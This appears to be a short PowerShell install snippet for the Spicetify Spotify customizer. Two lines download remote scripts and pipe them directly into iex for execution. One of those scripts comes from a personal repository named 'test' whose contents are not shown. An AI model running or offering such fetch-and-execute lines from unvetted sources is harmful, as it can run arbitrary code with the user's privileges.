iwr -useb https://raw.githubusercontent.com/GabiG31-scr1p/test/refs/heads/main/install.ps1 | iex;
iwr -useb https://raw.githubusercontent.com/spicetify/marketplace/main/resources/install.ps1 | iex;
spicetify restore backup apply --bypass-admin
